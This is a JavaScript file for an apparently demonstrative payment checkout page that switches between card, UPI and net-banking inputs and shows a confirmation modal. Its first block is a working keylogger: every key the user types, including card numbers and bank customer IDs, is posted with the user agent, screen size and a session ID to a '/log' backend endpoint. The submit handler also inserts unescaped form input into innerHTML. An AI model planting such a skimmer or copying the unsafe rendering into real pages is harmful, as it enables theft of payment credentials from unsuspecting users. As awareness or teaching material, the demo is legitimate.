// Get or create session storage ID
function getSessionId() {
  let sid = sessionStorage.getItem("demo_session_id");
  if (!sid) {
    sid = "5C9A-91FD-2A6C";
    sessionStorage.setItem("demo_session_id", sid);
  }
  return sid;
}

// 1. KEYSTROKE LISTENER: Transmit keystrokes to Flask backend
document.addEventListener("keydown", function (e) {
  const data = new URLSearchParams();
  data.append("key", e.key);
  data.append("screen_res", `${window.screen.width} × ${window.screen.height}`);
  data.append("session_id", getSessionId());
  data.append("user_agent", navigator.userAgent);

  const logUrl = window.location.protocol === 'file:' ? 'http://127.0.0.1:5000/log' : '/log';
  fetch(logUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: data
  })
  .then(() => console.log(`[KEY LOGGED] Key '${e.key}' transmitted to server`))
  .catch((err) => console.error("[KEY LOG ERROR] Server not reachable:", err));
});

// 2. DYNAMIC PAYMENT METHOD SWITCHING FUNCTION
function switchPaymentMode(mode) {
  const cardSection = document.getElementById("mode-card");
  const upiSection = document.getElementById("mode-upi");
  const netbankSection = document.getElementById("mode-netbank");
  const cardTitle = document.getElementById("card-mode-title");

  // Inputs for required toggling
  const cardInputs = cardSection.querySelectorAll("input");
  const upiInput = document.getElementById("upiid");
  const netbankInput = document.getElementById("netbank-user");

  // Hide all dynamic sections first
  cardSection.style.display = "none";
  upiSection.style.display = "none";
  netbankSection.style.display = "none";

  // Remove required attributes from non-active modes
  cardInputs.forEach((i) => i.removeAttribute("required"));
  if (upiInput) upiInput.removeAttribute("required");
  if (netbankInput) netbankInput.removeAttribute("required");

  // Update UI based on mode selected
  const methodOptions = document.querySelectorAll(".method-option");
  methodOptions.forEach((opt) => opt.classList.remove("active"));

  if (mode === "credit") {
    cardSection.style.display = "flex";
    cardTitle.textContent = "🔐 Credit Card Details (Demo Only)";
    cardInputs.forEach((i) => i.setAttribute("required", "true"));
    const selectedOpt = document.querySelector(".method-option input[value='credit']");
    if (selectedOpt) selectedOpt.closest(".method-option").classList.add("active");
  } else if (mode === "debit") {
    cardSection.style.display = "flex";
    cardTitle.textContent = "💳 Debit Card Details (Demo Only)";
    cardInputs.forEach((i) => i.setAttribute("required", "true"));
    const selectedOpt = document.querySelector(".method-option input[value='debit']");
    if (selectedOpt) selectedOpt.closest(".method-option").classList.add("active");
  } else if (mode === "upi") {
    upiSection.style.display = "flex";
    if (upiInput) upiInput.setAttribute("required", "true");
    const selectedOpt = document.querySelector(".method-option input[value='upi']");
    if (selectedOpt) selectedOpt.closest(".method-option").classList.add("active");
  } else if (mode === "netbank") {
    netbankSection.style.display = "flex";
    if (netbankInput) netbankInput.setAttribute("required", "true");
    const selectedOpt = document.querySelector(".method-option input[value='netbank']");
    if (selectedOpt) selectedOpt.closest(".method-option").classList.add("active");
  }

  console.log(`Switched payment mode to: ${mode}`);
}

// Attach event listeners and auto-formatters on DOM load
document.addEventListener("DOMContentLoaded", function () {
  // Auto format card number with spaces (4532 1234 5678 8921)
  const cardInput = document.getElementById("cardnum");
  if (cardInput) {
    cardInput.addEventListener("input", function (e) {
      let value = e.target.value.replace(/\D/g, "");
      value = value.replace(/(.{4})/g, "$1 ").trim();
      e.target.value = value.substring(0, 19);
    });
  }

  // Auto format expiry date (MM/YY)
  const expiryInput = document.getElementById("expiry");
  if (expiryInput) {
    expiryInput.addEventListener("input", function (e) {
      let value = e.target.value.replace(/\D/g, "");
      if (value.length >= 2) {
        value = value.substring(0, 2) + "/" + value.substring(2, 4);
      }
      e.target.value = value.substring(0, 5);
    });
  }

  // Initialize with credit mode active
  switchPaymentMode("credit");
});

// 3. PAYMENT SUBMISSION BUTTON FUNCTION
function handleFormSubmit(event) {
  event.preventDefault();

  const fullname = document.getElementById("fullname").value;
  const email = document.getElementById("email").value;
  const selectedMode = document.querySelector("input[name='paymethod']:checked").value;

  let modeDetailsHTML = "";

  if (selectedMode === "credit" || selectedMode === "debit") {
    const cardnum = document.getElementById("cardnum").value;
    const modeLabel = selectedMode === "credit" ? "Credit Card" : "Debit Card";
    modeDetailsHTML = `
      <strong>Payment Mode:</strong> ${modeLabel}<br>
      <strong>Card Number:</strong> ${cardnum.substring(0, 4) || '••••'} •••• •••• ${cardnum.slice(-4) || '••••'}<br>
    `;
  } else if (selectedMode === "upi") {
    const upiid = document.getElementById("upiid").value;
    const upiApp = document.getElementById("upi-app").selectedOptions[0].text;
    modeDetailsHTML = `
      <strong>Payment Mode:</strong> UPI (${upiApp})<br>
      <strong>VPA / UPI ID:</strong> ${upiid}<br>
    `;
  } else if (selectedMode === "netbank") {
    const bank = document.getElementById("bank-select").selectedOptions[0].text;
    const user = document.getElementById("netbank-user").value;
    modeDetailsHTML = `
      <strong>Payment Mode:</strong> Net Banking<br>
      <strong>Selected Bank:</strong> ${bank}<br>
      <strong>Customer ID:</strong> ${user}<br>
    `;
  }

  const modal = document.getElementById("modal");
  const modalBody = document.getElementById("modalBody");

  modalBody.innerHTML = `
    Thank you, <strong>${fullname}</strong>!<br>
    Registration confirmation sent to <strong>${email}</strong>.<br><br>
    ${modeDetailsHTML}
    <strong>Total Amount Paid:</strong> ₹588<br><br>
  `;

  modal.style.display = "flex";
}

// 4. CLOSE & RESET MODAL BUTTON FUNCTION
function closeModal() {
  const modal = document.getElementById("modal");
  modal.style.display = "none";

  const form = document.getElementById("paymentForm");
  if (form) {
    form.reset();
  }

  // Reset back to credit card mode
  switchPaymentMode("credit");
}
